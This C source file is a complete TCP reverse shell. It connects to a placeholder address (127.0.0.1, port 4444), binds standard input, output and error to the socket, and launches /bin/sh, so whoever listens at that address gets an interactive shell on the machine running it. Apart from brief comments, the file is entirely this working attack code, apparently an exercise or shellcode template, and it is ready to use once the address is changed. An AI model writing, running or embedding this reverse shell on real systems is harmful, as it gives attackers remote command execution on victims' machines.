#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

int main (){

	// Creating File Descriptor for the Socket
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	// Creating sockaddr_in structure for Remote Address
	struct sockaddr_in server;
	server.sin_family = AF_INET;
    	server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    	server.sin_port = htons(REMOTE_PORT);

	// Connecting to the Server
	int ret = connect(socket_fd, (struct sockaddr *)&server, sizeof(server));

	if (ret == 0)
	{
		// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Socked_FD
		dup2(socket_fd, 0); 
		dup2(socket_fd, 1);
		dup2(socket_fd, 2);
		
		// Invoking EXECVE
		execve("/bin/sh", 0, 0);

		// exit
		return 0;
	}else{
		return ret;
	}
}

